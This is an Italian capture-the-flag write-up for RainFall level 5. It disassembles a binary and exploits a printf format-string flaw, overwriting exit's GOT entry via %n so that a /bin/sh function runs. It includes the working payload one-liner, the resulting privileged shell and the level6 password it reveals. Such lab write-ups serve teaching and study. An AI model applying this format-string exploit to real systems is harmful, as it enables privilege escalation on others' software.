# Level 5
Controlliamo le stringhe presenti nell'eseguibile:
```
level5@RainFall:~$ readelf -p '.rodata' level5

String dump of section '.rodata':
  [     8]  /bin/sh
```
e ora passiamo a `gdb`:
```
level5@RainFall:~$ gdb -q level5
Reading symbols from /home/user/level5/level5...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  printf
0x08048380  printf@plt
0x08048390  _exit
0x08048390  _exit@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  system
0x080483b0  system@plt
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x080483d0  exit
0x080483d0  exit@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  o
0x080484c2  n
0x08048504  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
(gdb) disass main
Dump of assembler code for function main:
   0x08048504 <+0>:     push   %ebp
   0x08048505 <+1>:     mov    %esp,%ebp
   0x08048507 <+3>:     and    $0xfffffff0,%esp
   0x0804850a <+6>:     call   0x80484c2 <n>
   0x0804850f <+11>:    leave
   0x08048510 <+12>:    ret
End of assembler dump.
(gdb) disass n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp
   0x080484cb <+9>:     mov    0x8049848,%eax
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) disass o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x18,%esp
   0x080484aa <+6>:     movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    movl   $0x1,(%esp)
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.
```
### Funzione `main`
Chiama la funzione `n`

### Funzione `n`
Riserva 0x218 (536) byte nello stack e chiama le funzioni `fgets`, `printf` ed `exit`
nel seguente modo:
```
fgets(s, 512, stdin);
printf(s);
exit(1);
```

### Funzione `o`
Chiama le funzioni `system` ed `_exit` nel seguente modo:
```
system("/bin/sh");
_exit(1);
```

Quindi il programma riceve una stringa e la stampa senza mai passare per la funzione
`o` la quale avvia una shell, perciò sfruttando gli specificatori di printf
proprio come i livelli precedenti, dobbiamo scrivere l'indirizzo della funzione
`o` nell'offset della GOT (Global Offset Table) riguardante la funzione `exit`.
Come prima cosa andiamo alla ricerca dell'offset di `exit` nel seguente modo:
```
level5@RainFall:~$ objdump -R level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
```
Così da avere:
```
Offset exit : 08049838
Offset o    : 080484a4
```
Dunque basta scrivere con `%n` in `08049838` il numero `080484a4` (134513828) meno
i quattro caratteri dell'indirizzo: 134513824,
così il programma invece di eseguire la funzione `exit` eseguirà la funzione `o`.
Come nei livelli precedenti bisogna ovviamente trovare il numero di specificatori 
per arrivare all'inizio della stringa di printf che in questo caso sono 4.
Procediamo nel seguente modo:
```
level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08%134513824d%4$n"' > /tmp/exploit
level5@RainFall:~$ cat /tmp/exploit - | ./level5
                                                               512
id
uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users) groups=2064(level6),100(users),2045(level5)
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
```
level5@RainFall:~$ su level6
Password: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
level6@RainFall:~$
```